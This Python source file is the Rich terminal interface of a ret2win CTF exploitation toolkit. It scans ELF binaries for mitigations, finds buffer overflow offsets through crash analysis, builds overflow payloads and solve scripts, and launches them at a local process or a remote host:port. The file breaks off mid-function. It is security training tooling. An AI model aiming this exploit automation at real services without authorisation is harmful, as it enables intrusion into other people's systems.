#!/usr/bin/env python3
"""
tui.py - Ret2Win Pure Rich Terminal User Interface
Modern, full-fledged CTF Ret2Win exploitation toolkit built completely with Rich.
Features truecolor 2D RGB gradient banners, interactive mission control,
checksec audits, offset auto-detection, symbol browsing, and exploit execution.
Designed for Casper (CachyOS / Arch Linux).
"""

import os
import sys
import subprocess
from typing import Optional, Dict, Any, List, Tuple

# Enable readline for native line editing, history, and arrow key support on Linux
try:
    import readline
except ImportError:
    pass

# Ensure local module imports work from any execution directory
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.columns import Columns
from rich.align import Align
from rich.text import Text
from rich.syntax import Syntax
from rich.prompt import Prompt, Confirm
from rich.rule import Rule
from rich.status import Status

import core

# Rich auto-detects terminal width from the OS, but in a non-interactive or
# wrapped/piped context (CI logs, a captured transcript, some embedded/web
# terminals) that detection can return an enormous or meaningless column
# count, which blows every panel out to an unusable width. Clamp it to a
# sane maximum; real terminals wider than this just get a comfortably
# bounded layout instead of edge-to-edge panels.
_MAX_SANE_WIDTH = 120
console = Console(width=min(Console().size.width, _MAX_SANE_WIDTH))


def _first_prompt(markup: str) -> str:
    """Read one line of input for the very first prompt of the session, in a
    way that's safe to combine with GNU readline (see run()'s first_prompt
    flag for why this matters only for the first call). Rich's own
    Prompt.ask()/Console.input() print the styled prompt themselves via a
    plain console.print(..., end=""), then call bare input(), which hands
    off to readline if it's loaded. Readline never sees that text through
    its own API -- the `prompt` argument is how it learns what's already on
    the line -- so the very first time it actually reads a line in the
    process (its setup is lazy), it can reset to column 0 and redraw from
    its own empty idea of the line, erasing what Rich just printed; that
    only happens once per process, which is why every later prompt is fine.
    To dodge this, render the markup to a real ANSI string ourselves and
    pass THAT directly as input()'s prompt argument, so readline is aware of
    it from the start and draws/redraws it correctly itself.
    """
    with console.capture() as capture:
        console.print(markup, end="")
    ansi_prompt = capture.get()
    return input(ansi_prompt)

ASCII_BANNER = r"""
██████╗ ███████╗████████╗██████╗ ██╗    ██╗██╗███╗   ██╗
██╔══██╗██╔════╝╚══██╔══╝╚════██╗██║    ██║██║████╗  ██║
██████╔╝█████╗     ██║    █████╔╝██║ █╗ ██║██║██╔██╗ ██║
██╔══██╗██╔══╝     ██║   ██╔═══╝ ██║███╗██║██║██║╚██╗██║
██║  ██║███████╗   ██║   ███████╗╚███╔███╔╝██║██║ ╚████║
╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝ ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝
""".strip("\n")

SUBTITLE = "made by -Casper"

# Vibrant multi-stop cyber gradient palette: Cyan -> Spring Green -> Yellow -> Orange -> Pink -> Purple
GRADIENT_PALETTE = [
    "#00f0ff",  # Bright Cyan
    "#00ff88",  # Spring Neon Green
    "#70ff00",  # Electric Lime
    "#ffe600",  # Vivid Yellow
    "#ff6600",  # Electric Orange
    "#ff007f",  # Neon Magenta
    "#b026ff",  # Vivid Violet
]


def hex_to_rgb(hex_str: str) -> Tuple[int, int, int]:
    """Convert hex color string ('#rrggbb') to (r, g, b) tuple."""
    hex_str = hex_str.lstrip("#")
    return tuple(int(hex_str[i:i+2], 16) for i in (0, 2, 4))


def interpolate_rgb(c1: Tuple[int, int, int], c2: Tuple[int, int, int], factor: float) -> Tuple[int, int, int]:
    """Linearly interpolate between two RGB colors."""
    factor = max(0.0, min(1.0, factor))
    return tuple(int(c1[i] + (c2[i] - c1[i]) * factor) for i in range(3))


def create_gradient_banner(palette: Optional[List[str]] = None) -> Tuple[Text, Text]:
    """
    Renders the Ret2Win ASCII title with a smooth, continuous 2D mathematical
    RGB color gradient across each line and character, plus styled subtitle.
    """
    if palette is None:
        palette = GRADIENT_PALETTE

    rgb_stops = [hex_to_rgb(c) for c in palette]
    banner_lines = ASCII_BANNER.splitlines()
    text = Text()

    total_lines = len(banner_lines)
    max_line_len = max(len(l) for l in banner_lines) if banner_lines else 1

    for line_idx, line in enumerate(banner_lines):
        line_len = len(line)
        for char_idx, ch in enumerate(line):
            # Diagonal 2D gradient factor
            factor = (char_idx / max(1, max_line_len) * 0.75 + line_idx / max(1, total_lines) * 0.25)
            factor = max(0.0, min(1.0, factor))
            scaled = factor * (len(rgb_stops) - 1)
            seg_idx = min(int(scaled), len(rgb_stops) - 2)
            seg_factor = scaled - seg_idx
            r, g, b = interpolate_rgb(rgb_stops[seg_idx], rgb_stops[seg_idx + 1], seg_factor)
            text.append(ch, style=f"bold rgb({r},{g},{b})")
        text.append("\n")

    # Subtitle with smooth gradient sweep
    sub = f"─── Automated CTF Return-to-Win Exploitation Toolkit  •  {SUBTITLE} ───"
    sub_text = Text()
    for i, ch in enumerate(sub):
        factor = i / max(1, len(sub))
        scaled = factor * (len(rgb_stops) - 1)
        seg_idx = min(int(scaled), len(rgb_stops) - 2)
        seg_factor = scaled - seg_idx
        r, g, b = interpolate_rgb(rgb_stops[seg_idx], rgb_stops[seg_idx + 1], seg_factor)
        sub_text.append(ch, style=f"italic rgb({r},{g},{b})")

    return text, sub_text


def create_header_renderable() -> Text:
    """Builds the styled header for CLI or TUI mode."""
    title, sub = create_gradient_banner()
    combined = Text()
    combined.append(title)
    combined.append("\n")
    combined.append(sub)
    return combined


def copy_to_clipboard(content: str) -> bool:
    """Copy string content to system clipboard via wl-copy or xclip."""
    for cmd in [["wl-copy"], ["xclip", "-selection", "clipboard"]]:
        try:
            subprocess.run(cmd, input=content.encode("utf-8"), check=True, timeout=1.5)
            return True
        except Exception:
            pass
    return False


def kbadge(key: str, color: str = "bold cyan") -> str:
    """Safely format key badge without triggering Rich markup tags like [s], [b], etc."""
    return f"[{color}]\\[{key}][/{color}]"


def get_local_elf_files(directory: str = ".") -> List[Dict[str, Any]]:
    """Scan directory for valid ELF executables."""
    elf_files = []
    try:
        entries = sorted(os.listdir(directory))
    except OSError:
        return []

    for entry in entries:
        full_path = os.path.join(directory, entry)
        if not os.path.isfile(full_path):
            continue
        try:
            with open(full_path, "rb") as f:
                header = f.read(5)
                if header.startswith(b"\x7fELF"):
                    bits = 64 if header[4] == 2 else 32
                    size = os.path.getsize(full_path)
                    is_exec = os.access(full_path, os.X_OK)
                    elf_files.append({
                        "name": entry,
                        "path": full_path,
                        "bits": bits,
                        "size": size,
                        "executable": is_exec
                    })
        except Exception:
            pass
    return elf_files


class RichRet2WinTUI:
    """Pure-Rich Terminal User Interface for Ret2Win exploitation."""

    def __init__(
        self,
        binary: Optional[str] = None,
        win_addr: Optional[str] = None,
        offset: Optional[int] = None,
        align: bool = False,
        ret_gadget: Optional[str] = None,
        input_mode: str = "stdin",
        remote_host: Optional[str] = None,
        remote_port: Optional[str] = None
    ):
        self.binary_path = binary or ""
        self.win_addr_str = win_addr or ""
        self.offset = offset
        self.offset_validated = False
        self.align = align
        self.ret_gadget_str = ret_gadget or ""
        self.input_mode = input_mode  # 'stdin' or 'argv'
        self.target_mode = "local" if binary else "file"  # 'file', 'local', 'remote'
        self.remote_host = remote_host or ""
        self.remote_port = remote_port or ""
        self.output_path = "payload.bin"

        self.binary_info: Optional[Dict[str, Any]] = None
        self.all_symbols: List[Dict[str, Any]] = []
        self.last_status_msg: str = "Ready. Select a binary or load an ELF target."
        self.last_status_style: str = "dim"

        # If a binary was provided at launch, analyze it immediately
        if self.binary_path and os.path.isfile(self.binary_path):
            self.analyze_binary_silent(self.binary_path)
        else:
            # Auto-detect if there is an ELF in the current directory
            local_elfs = get_local_elf_files(".")
            if len(local_elfs) == 1:
                auto_bin = local_elfs[0]["path"]
                self.binary_path = auto_bin
                self.analyze_binary_silent(auto_bin)

    def clear_screen(self):
        """Separates the previous screen from the next one.

        This used to call Rich's Console.clear(), which writes a raw
        "\\x1b[2J\\x1b[H" ANSI clear/home escape sequence. Rich only
        suppresses that when is_dumb_terminal is set -- is_terminal isn't
        checked -- so in a lot of real-world setups (piped output, a
        captured transcript, many wrapped/embedded/web terminals that still
        report isatty()==True) the escape sequence doesn't get interpreted
        and shows up as literal garbage text, and an is_terminal check
        turned out not to reliably tell those environments apart from a
        real one either. Rather than guess, never emit the escape sequence
        at all: just print a separator and let the previous screen (and
        whatever the user just typed) scroll up naturally, with the next
        screen starting cleanly on its own line.
        """
        console.print()
        console.rule(style="dim")

    def set_status(self, msg: str, style: str = "green"):
        """Sets the live status message shown above the action menu."""
        self.last_status_msg = msg
        self.last_status_style = style

    def analyze_binary_silent(self, path: str):
        """Performs binary analysis without clearing the screen."""
        try:
            info = core.analyze_binary(path)
            self.binary_info = info
            self.binary_path = path

            # Auto-configure stack alignment and ret gadget for 64-bit
            if info["bits"] == 64:
                self.align = True
                if info["ret_gadget"]:
                    self.ret_gadget_str = info["ret_gadget"]
            else:
                self.align = False

            # Auto-fill win address if candidate found and currently empty
            if not self.win_addr_str and info["candidates"]:
                self.win_addr_str = info["candidates"][0]["addr"]

            try:
                self.all_symbols = core.get_elf_functions(path)
            except Exception:
                self.all_symbols = []

            self.set_status(f"Analyzed {os.path.basename(path)} ({info['arch']}, {info['bits']}-bit)", "bold green")
        except Exception as e:
            self.set_status(f"Analysis failed: {e}", "bold red")

    def _get_parsed_win_addr(self) -> Optional[int]:
        if not self.win_addr_str:
            return None
        symbols = self.binary_info.get("symbols") if self.binary_info else None
        try:
            return core.parse_address(self.win_addr_str, symbols=symbols)
        except Exception:
            return None

    def _get_parsed_ret_gadget(self) -> Optional[int]:
        if not self.ret_gadget_str:
            return None
        symbols = self.binary_info.get("symbols") if self.binary_info else None
        try:
            return core.parse_address(self.ret_gadget_str, symbols=symbols)
        except Exception:
            return None

    def render_dashboard(self):
        """Renders the complete rich UI dashboard with gradient banner, panels, and menu.

        Does not clear the screen itself: it's called once at startup (with
        a single clear_screen() right before it, in run()) and again on
        demand via the [m]/menu command, where it should just print inline
        below whatever's already on screen, like any other command's
        output, rather than wiping the scrollback.
        """
        # 1. Gradient Title Banner & Casper Subtitle
        banner_text, sub_text = create_gradient_banner()
        console.print(Align.center(banner_text))
        console.print(Align.center(sub_text))
        console.print()

        # 2. Left Panel: Target Binary & Mitigations
        t_left = Table(show_header=False, box=None, padding=(0, 1), expand=True)
        t_left.add_column("Field", style="bold cyan", width=14)
        t_left.add_column("Value")

        if not self.binary_info:
            bin_display = self.binary_path if self.binary_path else "[dim]No binary selected[/dim]"
            t_left.add_row("Binary:", bin_display)
            t_left.add_row("Architecture:", "[dim]Unknown[/dim]")
            t_left.add_row("Checksec:", "[dim]Run 'Select/Scan Binary' to inspect[/dim]")
            t_left.add_row("Win Candidates:", "[dim]None[/dim]")
            t_left.add_row("Ret Gadget:", "[dim]None[/dim]")
        else:
            info = self.binary_info
            bin_name = os.path.basename(info["path"])
            t_left.add_row("Binary:", f"[bold white]{bin_name}[/bold white] [dim]({info['path']})[/dim]")
            t_left.add_row("Arch:", f"[bold bright_cyan]{info['arch']}[/bold bright_cyan] [dim]({info['bits']}-bit, {info['endian']})[/dim]")

            # Checksec tags
            relro_tag = f"[cyan]{info['relro']}[/cyan]"
            canary_tag = "[bold red]Canary Present[/bold red]" if info["canary"] else "[bold green]No Canary (Vulnerable)[/bold green]"
            nx_tag = "[bold yellow]NX Enabled[/bold yellow]" if info["nx"] else "[bold green]NX Disabled[/bold green]"
            pie_tag = "[bold yellow]PIE Enabled[/bold yellow]" if info["pie"] else "[bold green]No PIE (Fixed 0x400000)[/bold green]"
            t_left.add_row("Mitigations:", f"{relro_tag} │ {canary_tag}")
            t_left.add_row("", f"{nx_tag} │ {pie_tag}")

            # Discovered Candidates
            candidates = info["candidates"]
            if candidates:
                cand_str = ", ".join(f"[bold green]{c['name']}[/bold green] ([dim]{c['addr']}[/dim])" for c in candidates[:3])
                if len(candidates) > 3:
                    cand_str += f" [dim]+{len(candidates)-3} more[/dim]"
                t_left.add_row("Candidates:", cand_str)
            else:
                t_left.add_row("Candidates:", "[dim]None detected (check Symbol Browser)[/dim]")

            ret_g = self.ret_gadget_str if self.ret_gadget_str else "[dim]None[/dim]"
            t_left.add_row("Ret Gadget:", f"[yellow]{ret_g}[/yellow] [dim](x86_64 16B align)[/dim]")

        p_left = Panel(t_left, title="[bold cyan]🎯 Target Binary & Mitigations[/bold cyan]", border_style="cyan")

        # 3. Right Panel: Exploit Configuration
        t_right = Table(show_header=False, box=None, padding=(0, 1), expand=True)
        t_right.add_column("Field", style="bold magenta", width=15)
        t_right.add_column("Value")

        # Win function display
        win_parsed = self._get_parsed_win_addr()
        if win_parsed is not None:
            win_display = f"[bold green]{hex(win_parsed)}[/bold green] [dim]({self.win_addr_str})[/dim]"
        else:
            win_display = f"[bold red]{self.win_addr_str or 'Not Set'}[/bold red]"
        t_right.add_row("Win Target:", win_display)

        # Offset display
        if self.offset is not None:
            valid_tag = " [bold green]✓ Validated[/bold green]" if self.offset_validated else " [dim](unverified)[/dim]"
            offset_display = f"[bold yellow]{self.offset} bytes[/bold yellow]{valid_tag}"
        else:
            offset_display = "[bold red]Not Found[/bold red] [dim](run Auto-Detect)[/dim]"
        t_right.add_row("Offset:", offset_display)

        # Stack alignment
        if self.align:
            align_display = f"[bold green]Enabled[/bold green] [dim](lone ret {self.ret_gadget_str or 'needed'})[/dim]"
        else:
            align_display = "[dim]Disabled[/dim]"
        t_right.add_row("Stack Align:", align_display)

        # Input mode
        input_display = "[bold cyan]stdin (Standard Input)[/bold cyan]" if self.input_mode == "stdin" else "[bold yellow]argv[1] (Command Line Arg)[/bold yellow]"
        t_right.add_row("Delivery:", input_display)

        # Target Destination
        if self.target_mode == "local":
            dest_display = f"[bold green]Local Process[/bold green] [dim]({os.path.basename(self.binary_path) if self.binary_path else 'none'})[/dim]"
        elif self.target_mode == "remote":
            dest_display = f"[bold yellow]Remote Service[/bold yellow] [dim]({self.remote_host}:{self.remote_port})[/dim]"
        else:
            dest_display = f"[bold cyan]File Only[/bold cyan] [dim]({self.output_path})[/dim]"
        t_right.add_row("Destination:", dest_display)

        # Calculated Payload Size
        if self.offset is not None and win_parsed is not None:
            bits = self.binary_info["bits"] if self.binary_info else 64
            ret_g_parsed = self._get_parsed_ret_gadget() if self.align else None
            payload_len = self.offset + (8 if (self.align and bits == 64 and ret_g_parsed) else 0) + (8 if bits == 64 else 4)
            size_display = f"[bold white]{payload_len} bytes[/bold white] [dim]({self.output_path})[/dim]"
        else:
            size_display = "[dim]Configure offset & win to compute[/dim]"
        t_right.add_row("Payload Size:", size_display)

        p_right = Panel(t_right, title="[bold magenta]⚙️ Exploit Configuration[/bold magenta]", border_style="magenta")

        # Display side-by-side panels
        console.print(Columns([p_left, p_right], equal=True))

        # 4. Status Bar
        console.print(f" Status: [{self.last_status_style}]{self.last_status_msg}[/{self.last_status_style}]")
        console.print()

        # 5. Interactive Action Menu
        menu_table = Table(title="[bold bright_cyan]⚡ Mission Control Actions[/bold bright_cyan]", box=None, padding=(0, 2), expand=True, show_header=False)
        menu_table.add_column("Col1")
        menu_table.add_column("Col2")
        menu_table.add_column("Col3")

        menu_table.add_row(
            f"{kbadge('1')} 🎯 Select/Scan Binary",
            f"{kbadge('2')} ⚡ Auto-Detect Offset",
            f"{kbadge('3')} ✓ Validate Offset"
        )
        menu_table.add_row(
            f"{kbadge('4')} ⚙️ Set Win Address/Symbol",
            f"{kbadge('5')} 🔄 Toggle 16B Alignment",
            f"{kbadge('6')} 📥 Toggle Delivery (stdin/argv)"
        )
        menu_table.add_row(
            f"{kbadge('7')} 🌐 Set Exploit Destination",
            f"{kbadge('8')} 🔍 Inspect Payload & Hexdump",
            f"{kbadge('9')} 🏛️ ELF Symbol Browser"
        )
        menu_table.add_row(
            f"{kbadge('s')} 📜 View & Save solve.py",
            f"{kbadge('g')} 💾 Generate Payload File",
            f"{kbadge('f', 'bold red')} 🔥 Fire Exploit Session"
        )
        menu_table.add_row(
            f"{kbadge('r')} ▶ Run solve.py directly",
            f"{kbadge('h')} 📖 Help & CTF Cheatsheet",
            f"{kbadge('q', 'bold bright_black')} ❌ Quit Ret2Win"
        )

        p_menu = Panel(menu_table, border_style="bright_blue", padding=(0, 1))
        console.print(p_menu)

    # --- Interactive Action Implementations ---

    def action_select_binary(self):
        """Browse local ELFs or type custom binary path."""
        console.print()
        console.print(Rule("[bold cyan]📂 Select Target Binary[/bold cyan]"))
        console.print()

        local_elfs = get_local_elf_files(".")
        if local_elfs:
            console.print("[bold green]Discovered Local ELF Binaries in Current Directory:[/bold green]")
            for i, elf in enumerate(local_elfs):
                size_kb = f"{elf['size'] / 1024:.1f} KB"
                console.print(f"  [bold cyan][{i+1}][/bold cyan] [bold white]{elf['name']}[/bold white]  [dim]({elf['bits']}-bit, {size_kb})[/dim]")
            console.print()

        console.print(f"  {kbadge('c', 'bold yellow')} Enter custom binary path manually")
        console.print(f"  {kbadge('b', 'bold yellow')} Back to main menu")
        console.print()

        choice = Prompt.ask("[bold cyan]Select an option[/bold cyan]", default="1" if local_elfs else "c").strip()
        if choice.lower() == "b":
            return
        elif choice.lower() == "c":
            path = Prompt.ask("[bold cyan]Enter path to target ELF binary[/bold cyan]").strip()
            if not path:
                return
            if not os.path.isfile(path):
                self.set_status(f"File not found: {path}", "bold red")
                return
            self.analyze_binary_silent(path)
        elif choice.isdigit() and 1 <= int(choice) <= len(local_elfs):
            selected = local_elfs[int(choice) - 1]["path"]
            self.analyze_binary_silent(selected)
        else:
            self.set_status(f"Invalid selection: {choice}", "yellow")

    def action_detect_offset(self):
        """Auto-detect offset via De Bruijn cyclic crash."""
        if not self.binary_path or not os.path.isfile(self.binary_path):
            self.set_status("Please select a target binary first.", "bold red")
            return

        console.print()
        console.print(Rule("[bold cyan]⚡ Buffer Overflow Offset Auto-Detection[/bold cyan]"))
        console.print()
        console.print(f"Target: [bold white]{self.binary_path}[/bold white]  │  Delivery: [bold cyan]{self.input_mode}[/bold cyan]")
        console.print()

        max_len_str = Prompt.ask("Max cyclic pattern length", default="2048").strip()
        try:
            max_len = int(max_len_str)
        except ValueError:
            max_len = 2048

        with console.status("[bold cyan]Crashing target binary with De Bruijn cyclic pattern & inspecting core dump...", spinner="dots"):
            try:
                offset = core.find_offset(self.binary_path, max_len=max_len, input_mode=self.input_mode)
                self.offset = offset
                self.offset_validated = False
                self.set_status(f"Offset found: {offset} bytes (via core dump crash analysis)", "bold green")
            except Exception as e:
                self.set_status(f"Offset detection failed: {e}", "bold red")
                return

        # Prompt for immediate validation
        console.print(f"\n[bold green]✓ Offset successfully detected: {self.offset} bytes![/bold green]")
        if Confirm.ask("\nValidate this offset now with marker crash test?", default=True):
            self.action_validate_offset()

    def action_validate_offset(self):
        """Sanity check proposed offset with marker bytes."""
        if not self.binary_path or self.offset is None:
            self.set_status("Target binary and offset must be set before validation.", "bold red")
            return

        with console.status(f"[bold cyan]Validating offset {self.offset} with test marker crash...", spinner="dots"):
            try:
                is_valid = core.validate_offset(self.binary_path, self.offset, input_mode=self.input_mode)
                if is_valid:
                    self.offset_validated = True
                    self.set_status(f"Offset {self.offset} verified and validated successfully! (RIP/EIP precisely controlled)", "bold green")
                else:
                    self.offset_validated = False
                    self.set_status(f"Offset {self.offset} validation failed (marker did not match instruction pointer)", "bold yellow")
            except Exception as e:
                self.set_status(f"Validation error: {e}", "bold red")

    def action_set_win_addr(self):
        """Configure win function address or symbol."""
        console.print()
        console.print(Rule("[bold magenta]⚙️ Configure Win Function[/bold magenta]"))
        console.print()

        candidates = self.binary_info.get("candidates", []) if self.binary_info else []
        if candidates:
            console.print("[bold green]Discovered Candidate Win Functions in Symbol Table:[/bold green]")
            for i, c in enumerate(candidates):
                console.print(f"  [bold cyan][{i+1}][/bold cyan] [bold white]{c['name']}[/bold white] @ [bold green]{c['addr']}[/bold green]")
            console.print()

        console.print(f"  {kbadge('c', 'bold yellow')} Enter custom symbol name or hex address (e.g. 0x401156 or 'win')")
        console.print(f"  {kbadge('b', 'bold yellow')} Back")
        console.print()

        choice = Prompt.ask("[bold magenta]Select win target[/bold magenta]", default="1" if candidates else "c").strip()
        if choice.lower() == "b":
            return
        elif choice.lower() == "c":
            val = Prompt.ask("[bold magenta]Enter address or symbol[/bold magenta]").strip()
            if val:
                symbols = self.binary_info.get("symbols") if self.binary_info else None
                try:
                    parsed = core.parse_address(val, symbols=symbols)
                    self.win_addr_str = hex(parsed)
                    self.set_status(f"Win target set to {self.win_addr_str}", "bold green")
                except Exception as e:
                    self.set_status(f"Failed to parse address: {e}", "bold red")
        elif choice.isdigit() and 1 <= int(choice) <= len(candidates):
            selected = candidates[int(choice) - 1]
            self.win_addr_str = selected["addr"]
            self.set_status(f"Win target set to {selected['name']} ({selected['addr']})", "bold green")

    def action_toggle_align(self):
        """Toggle 16-byte stack alignment ret gadget."""
        self.align = not self.align
        if self.align and not self.ret_gadget_str:
            if self.binary_info and self.binary_info.get("ret_gadget"):
                self.ret_gadget_str = self.binary_info["ret_gadget"]
            else:
                # No default here: "0x40101a" previously shown as a default
                # looked like a real detected gadget and would be silently
                # accepted on a bare Enter, poisoning the payload with an
                # address that has nothing to do with the user's binary.
                custom_ret = Prompt.ask(
                    "Enter lone ret gadget address (hex, no gadget auto-detected)",
                    default=""
                ).strip()
                if custom_ret:
                    self.ret_gadget_str = custom_ret
                else:
                    self.set_status(
                        "No ret gadget set -- alignment enabled but payload will NOT include a gadget.",
                        "yellow"
                    )
        state = "Enabled" if self.align else "Disabled"
        self.set_status(f"16-byte stack alignment: {state}", "bold green" if self.align else "yellow")

    def action_toggle_input_mode(self):
        """Toggle delivery mode between stdin and argv[1]."""
        self.input_mode = "argv" if self.input_mode == "stdin" else "stdin"
        self.set_status(f"Delivery mode switched to: {self.input_mode}", "bold cyan")

    def action_set_destination(self):
        """Configure exploit destination: local, remote, or file."""
        console.print()
        console.print(Rule("[bold cyan]🌐 Configure Exploit Destination[/bold cyan]"))
        console.print()
        console.print("  [bold cyan][1][/bold cyan] Launch Local Process (interactive tty session)")
        console.print("  [bold cyan][2][/bold cyan] Connect Remote CTF Service (host:port)")
        console.print("  [bold cyan][3][/bold cyan] Generate Payload File Only (save to disk)")
        console.print(f"  {kbadge('b', 'bold yellow')} Back")
        console.print()

        choice = Prompt.ask("Select destination", default="1").strip()
        if choice == "1":
            self.target_mode = "local"
            self.set_status("Destination set to Local Process", "bold green")
        elif choice == "2":
            self.target_mode = "remote"
            host = Prompt.ask("Remote Host / IP", default=self.remote_host or "127.0.0.1").strip()
            port = Prompt.ask("Remote Port", default=self.remote_port or "1337").strip()
            self.remote_host = host
            self.remote_port = port
            self.set_status(f"Destination set to Remote Service: {host}:{port}", "bold green")
        elif choice == "3":
            self.target_mode = "file"
            self.output_path = Prompt.ask("Output file path", default=self.output_path).strip()
            self.set_status(f"Destination set to File: {self.output_path}", "bold green")

    def action_inspect_payload(self):
        """Display payload breakdown table and colorized hexdump."""
        win_parsed = self._get_parsed_win_addr()
        if self.offset is None or win_parsed is None:
            self.set_status("Both offset and win address must be configured to inspect payload.", "bold red")
            return

        bits = self.binary_info["bits"] if self.binary_info else 64
        ret_g_parsed = self._get_parsed_ret_gadget() if self.align else None

        payload, table = core.format_payload_breakdown(
            offset=self.offset,
            win_addr=win_parsed,
            bits=bits,
            align=self.align,
            ret_gadget=ret_g_parsed
        )

        hexdump_text = core.format_colorized_hexdump(
            payload=payload,
            offset=self.offset,
            has_align=self.align,
            bits=bits,
            ret_gadget=ret_g_parsed
        )

        console.print()
        console.print(Rule("[bold cyan]🔍 Payload Inspector & Colorized Hexdump[/bold cyan]"))
        console.print()
        console.print(table)
        console.print()
        console.print(Panel(hexdump_text, title="[bold green]Colorized Hexdump (Red=Junk, Yellow=Ret Align, Green=Win Address)[/bold green]", border_style="green"))
        console.print(f"  {kbadge('c')} Copy raw hex to clipboard")
        console.print(f"  {kbadge('b')} Copy Python bytes literal to clipboard")
        console.print(f"  {kbadge('s')} Save to file")
        console.print(f"  {kbadge('Enter', 'bold yellow')} Back to main menu")
        console.print()

        sub_choice = Prompt.ask("Action", default="").strip().lower()
        if sub_choice == "c":
            if copy_to_clipboard(payload.hex()):
                self.set_status("Payload hex copied to clipboard!", "bold green")
            else:
                self.set_status(f"Hex: {payload.hex()[:32]}...", "cyan")
        elif sub_choice == "b":
            if copy_to_clipboard(repr(payload)):
                self.set_status("Python bytes literal copied to clipboard!", "bold green")
            else:
                self.set_status(f"Bytes: {repr(payload)[:32]}...", "cyan")
        elif sub_choice == "s":
            self.action_generate_payload()

    def action_browse_symbols(self):
        """Search and inspect all ELF functions from symbol table."""
        if not self.binary_path or not os.path.isfile(self.binary_path):
            self.set_status("Select a target binary first to browse symbols.", "bold red")
            return

        if not self.all_symbols:
            try:
                self.all_symbols = core.get_elf_functions(self.binary_path)
            except Exception as e:
                self.set_status(f"Failed to read symbols: {e}", "bold red")
                return

        console.print()
        console.print(Rule("[bold cyan]🏛️ ELF Symbol Browser[/bold cyan]"))
        console.print()

        filter_query = Prompt.ask("Filter symbols by name/address (leave empty for all)", default="").strip().lower()

        sym_table = Table(title=f"Symbols in {os.path.basename(self.binary_path)}", show_header=True, header_style="bold cyan")
        sym_table.add_column("No.", justify="right", width=5)
        sym_table.add_column("Symbol Name", style="bold")
        sym_table.add_column("Address", style="green")
        sym_table.add_column("Type")

        matched = []
        for sym in self.all_symbols:
            name = sym["name"]
            addr = sym["addr"]
            if filter_query and filter_query not in name.lower() and filter_query not in addr.lower():
                continue
            matched.append(sym)

        for i, sym in enumerate(matched[:40]):
            is_cand = sym.get("is_candidate", False)
            tag = "[bold green]★ Candidate[/bold green]" if is_cand else "[dim]Function[/dim]"
            name_disp = f"[bold green]{sym['name']}[/bold green]" if is_cand else sym["name"]
            sym_table.add_row(str(i + 1), name_disp, sym["addr"], tag)

        console.print(sym_table)
        if len(matched) > 40:
            console.print(f"[dim]...showing 40 of {len(matched)} matching symbols. Refine filter to narrow down.[/dim]")

        console.print("\nPick a number to set as win target, or press [bold yellow]Enter[/bold yellow] to go back.")
        pick = Prompt.ask("Selection", default="").strip()
        if pick.isdigit() and 1 <= int(pick) <= min(40, len(matched)):
            selected = matched[int(pick) - 1]
            self.win_addr_str = selected["addr"]
            self.set_status(f"Win target set to {selected['name']} ({selected['addr']})", "bold green")

    def action_solve_script(self):
        """View, save, or run standalone solve.py script."""
        win_parsed = self._get_parsed_win_addr()
        if self.offset is None or win_parsed is None or not self.binary_path:
            self.set_status("Target, offset, and win address are required to generate solve script.", "bold red")
            return

        bits = self.binary_info["bits"] if self.binary_info else 64
        ret_g_parsed = self._get_parsed_ret_gadget() if self.align else None
        remote_target = (self.remote_host, int(self.remote_port)) if (self.target_mode == "remote" and self.remote_host and self.remote_port.isdigit()) else None

        script_code = core.generate_solve_script(
            binary_path=self.binary_path,
            offset=self.offset,
            win_addr=win_parsed,
            bits=bits,
            align=self.align,
            ret_gadget=ret_g_parsed,
            remote_target=remote_target,
            input_mode=self.input_mode
        )

        console.print()
        console.print(Rule("[bold green]📜 Generated Standalone solve.py[/bold green]"))
        console.print()
        console.print(Syntax(script_code, "python", theme="monokai", line_numbers=True))
        console.print()
        console.print("  [bold cyan][1][/bold cyan] 💾 Save to solve.py on disk")
        console.print("  [bold cyan][2][/bold cyan] 📋 Copy script to clipboard")
        console.print("  [bold cyan][3][/bold cyan] ▶ Execute solve.py now")
        console.print("  [bold yellow][Enter][/bold yellow] Back to main menu")
        console.print()

        choice = Prompt.ask("Action", default="1").strip()
        if choice == "1":
            with open("solve.py", "w") as f:
                f.write(script_code)
            self.set_status("solve.py successfully saved to current directory!", "bold green")
        elif choice == "2":
            if copy_to_clipboard(script_code):
                self.set_status("solve.py script copied to clipboard!", "bold green")
            else:
                self.set_status("Clipboard tool not found. Use 'Save to solve.py'.", "yellow")
        elif choice == "3":
            with open("solve.py", "w") as f:
                f.write(script_code)
            self.action_run_solve_script()

    def action_generate_payload(self):
        """Write raw payload to disk."""
        win_parsed = self._get_parsed_win_addr()
        if self.offset is None or win_parsed is None:
            self.set_status("Offset and win address required to build payload.", "bold red")
            return

        bits = self.binary_info["bits"] if self.binary_info else 64
        ret_g_parsed = self._get_parsed_ret_gadget() if self.align else None

        payload = core.build_payload(
            offset=self.offset,
            win_addr=win_parsed,
            bits=bits,
            align=self.align,
            ret_gadget=ret_g_parsed
        )

        try:
            with open(self.output_path, "wb") as f:
                f.write(payload)
            self.set_status(f"Payload written to {self.output_path} ({len(payload)} bytes)", "bold green")
        except Exception as e:
            self.set_status(f"Failed to write payload: {e}", "bold red")

    def action_fire_exploit(self):
        """Confirm and launch exploit against chosen target."""
        win_parsed = self._get_parsed_win_addr()
        if self.offset is None or win_parsed is None:
            self.set_status("Offset and win address must be configured before firing.", "bold red")
            return

        if self.target_mode == "local" and (not self.binary_path or not os.path.isfile(self.binary_path)):
            self.set_status("Destination is Local Process, but no valid binary is selected.", "bold red")
            return
        if self.target_mode == "remote" and (not self.remote_host or not self.remote_port):
            self.set_status("Destination is Remote Service, but host/port are not set.", "bold red")
            return

        bits = self.binary_info["bits"] if self.binary_info else 64
        ret_g_parsed = self._get_parsed_ret_gadget() if self.align else None

        payload = core.build_payload(
            offset=self.offset,
            win_addr=win_parsed,
            bits=bits,
            align=self.align,
            ret_gadget=ret_g_parsed
        )

        dest_desc = f"Local Process ({self.binary_path})" if self.target_mode == "local" else f"Remote Service ({self.remote_host}:{self.remote_port})"
        if self.target_mode == "file":
            self.action_generate_payload()
            return

        console.print()
        console.print(Rule("[bold red]🔥 Confirm Exploit Execution[/bold red]"))
        console.print()
        console.print(f"Target:       [bold cyan]{dest_desc}[/bold cyan]")
        console.print(f"Payload Size: [bold green]{len(payload)} bytes[/bold green]")
        console.print(f"Win Address:  [bold green]{hex(win_parsed)}[/bold green]")
